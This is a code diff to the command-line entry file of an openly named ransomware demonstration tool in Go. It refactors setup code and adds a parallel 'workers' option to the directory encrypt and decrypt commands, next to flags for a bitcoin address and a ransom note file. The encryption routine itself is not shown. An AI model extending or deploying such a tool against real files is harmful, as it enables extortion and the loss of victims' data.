@@ -11,20 +11,19 @@ import (
 	urfavecli "github.com/urfave/cli/v2"
 )
 
-const APP_NAME = "ransomware"
-const APP_DESCRIPTION = "A simple demonstration tool to simulate a ransomware attack"
-const APP_VERSION = "v1.0.0"
+const (
+	APP_NAME        = "ransomware"
+	APP_DESCRIPTION = "A simple demonstration tool to simulate a ransomware attack"
+	APP_VERSION     = "v1.0.0"
+)
 
-func Init() func(*urfavecli.Context) error {
-	return func(ctx *urfavecli.Context) error {
-		if !ctx.Bool("verbose") {
-			utils.DisableLogs()
-		} else {
-			figure.NewFigure(APP_NAME, "graffiti", true).Print()
-		}
-
-		return nil
+func beforeCommand(ctx *urfavecli.Context) error {
+	if !ctx.Bool("verbose") {
+		utils.DisableLogs()
+	} else {
+		figure.NewFigure(APP_NAME, "graffiti", true).Print()
 	}
+	return nil
 }
 
 func main() {
@@ -51,7 +50,7 @@ func main() {
 				Name:    "create-keys",
 				Aliases: []string{"c"},
 				Usage:   "Generates a new random keypair and saves it to a file",
-				Before:  Init(),
+				Before:  beforeCommand,
 				Flags: []urfavecli.Flag{
 					&urfavecli.StringFlag{
 						Name:    "path",
@@ -66,7 +65,7 @@ func main() {
 				Name:    "encrypt",
 				Usage:   "Encrypts a directory",
 				Aliases: []string{"e"},
-				Before:  Init(),
+				Before:  beforeCommand,
 				Flags: []urfavecli.Flag{
 					&urfavecli.StringFlag{
 						Name:     "path",
@@ -128,6 +127,12 @@ func main() {
 						Usage: "the bitcoin address to use",
 						Value: "<bitcoin address>",
 					},
+					&urfavecli.IntFlag{
+						Name:    "workers",
+						Aliases: []string{"w"},
+						Usage:   "number of parallel workers (clamped to NumCPU); higher values increase memory usage with large files",
+						Value:   1,
+					},
 				},
 				Action: cli.Encrypt,
 			},
@@ -135,7 +140,7 @@ func main() {
 				Name:    "decrypt",
 				Usage:   "Decrypts a directory",
 				Aliases: []string{"d"},
-				Before:  Init(),
+				Before:  beforeCommand,
 				Flags: []urfavecli.Flag{
 					&urfavecli.StringFlag{
 						Name:     "path",
@@ -167,6 +172,12 @@ func main() {
 						Name:  "ransomFileName",
 						Usage: "defines the name of the ransom file name",
 						Value: "IMPORTANT.txt",
+					},
+					&urfavecli.IntFlag{
+						Name:    "workers",
+						Aliases: []string{"w"},
+						Usage:   "number of parallel workers (clamped to NumCPU); higher values increase memory usage with large files",
+						Value:   1,
 					},
 				},
 				Action: cli.Decrypt,
